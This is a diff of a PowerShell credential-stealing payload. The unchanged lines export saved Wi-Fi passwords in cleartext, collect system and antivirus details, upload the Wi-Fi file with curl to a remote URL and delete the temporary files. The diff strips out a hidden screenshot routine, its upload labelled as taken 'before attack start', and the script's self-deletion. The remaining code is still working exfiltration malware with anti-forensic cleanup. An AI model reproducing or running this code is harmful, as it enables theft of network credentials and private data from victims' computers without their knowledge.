@@ -15,33 +15,6 @@
 echo "" > "$env:temp\WIFI-$namepc.txt";
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
 
-# Screenshot
-  cd "$env:temp";
-  echo 'function Get-ScreenCapture' > "d.ps1";
-  echo '{' >> "d.ps1";
-  echo '    begin {' >> "d.ps1";
-  echo '        Add-Type -AssemblyName System.Drawing, System.Windows.Forms' >> "d.ps1";
-  echo '        Add-Type -AssemblyName System.Drawing' >> "d.ps1";
-  echo '        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |' >> "d.ps1";
-  echo '            Where-Object { $_.FormatDescription -eq "JPEG" }' >> "d.ps1";
-  echo '    }' >> "d.ps1";
-  echo '    process {' >> "d.ps1";
-  echo '        Start-Sleep -Milliseconds 44' >> "d.ps1";
-  echo '            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")' >> "d.ps1";
-  echo '        Start-Sleep -Milliseconds 550' >> "d.ps1";
-  echo '        $bitmap = [Windows.Forms.Clipboard]::GetImage()' >> "d.ps1";
-  echo '        $ep = New-Object Drawing.Imaging.EncoderParameters' >> "d.ps1";
-  echo '        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)' >> "d.ps1";
-  echo '        $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture"' >> "d.ps1";
-  echo '        $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep)' >> "d.ps1";
-  echo '    }' >> "d.ps1";
-  echo '}' >> "d.ps1";
-  echo 'Get-ScreenCapture' >> "d.ps1";
-  sleep 1
-  $screencapture = echo $env:temp"\"$env:UserName"_Capture"
-  powershell -c $env:temp\d.ps1;
-  $Screencap = "$env:temp\d.ps1";
-
 # Get PC information
   dir env: >> "$env:temp\stats-$namepc.txt";
 # List which AntiVirus Product is being used
@@ -66,20 +39,9 @@ cd $env:temp;
 # Upload wifi password
   curl.exe -F "file2=@WIFI-$namepc.txt" $url;
 
-# Upload screenshot
-  sleep 1
-  $Body=@{ content = "**Screen Capture before attack start**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-  curl.exe -F "file2=@$screencapture.jpg" $url;
 
 #Delete all file
 # Delete stat
   Remove-Item "stats-$namepc.txt" -Force -Recurse;
 # Delete wifi password
   Remove-Item "WIFI-$namepc.txt" -Force -Recurse;
-# Delete screenshot
-  Remove-Item  $screencapture* -Force -Recurse;
-# Delete this script
-  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
-# Delete screencapture script
-  Remove-Item $env:temp\d.ps1 -Force -Recurse;
